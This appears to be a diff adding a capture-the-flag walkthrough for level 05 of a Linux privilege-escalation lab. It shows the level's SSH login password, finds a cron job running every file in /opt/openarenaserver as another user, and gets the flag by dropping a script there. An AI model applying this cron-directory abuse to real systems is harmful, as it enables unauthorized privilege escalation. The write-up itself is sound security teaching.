@@ -1,0 +1,68 @@
+# 05
+
+Login
+
+```b
+> ssh level05@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
+> Password: ne2searoevaevoem4ov4ar8ap
+```
+
+Observation
+- a _hint_ says "mail" and "cronjob"
+- also doing `find / -name level05 2>/dev/null` tells us 'mail' is the key
+
+Inspect `/var/mail`
+
+```b
+> ls /var/mail
+level05
+
+> ls -l /var/mail/
+-rw-r--r--+ 1 root mail 58 Nov 17 20:25 level05
+^ ie. file
+
+> cat /var/mail/level05 
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
+
+👆 There's a cronjob
+- it runs every 2nd minute
+- it runs a script as flag05
+
+Inspect `/usr/sbin/openarenaserver`
+
+```b
+> ls -l /usr/sbin/openarenaserver
+-rwxr-x---+ 1 flag05 flag05 /usr/sbin/openarenaserver
+              ^^^^^^ ^^^^^^ resource excl. to user flag05
+
+> cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+```
+
+What this script does:
+- it runs each file of `/opt/openarenaserver/*` 
+- for each file, limit its exec runtime to 5 seconds
+- for each file, we print out what it is, if it is a _script_
+- rmv each file after use
+
+Exploit
+- put a script inside `/opt/openarenaserver/` 
+
+```r
+$ \
+echo '/bin/getflag > /tmp/temp' > /opt/openarenaserver/go.sh && \
+chmod +x /opt/openarenaserver/go.sh
+
+# remember
+# `/usr/sbin/openarenaserver` runs `bash -x` in a subshell
+# it'll stdout nothing whether we `tee` `tee /dev/tty` or `sync` 
+```
+
+- ~~use `tee` : _read stdin and write to stdout and files_~~
+- let it be run in 2min 
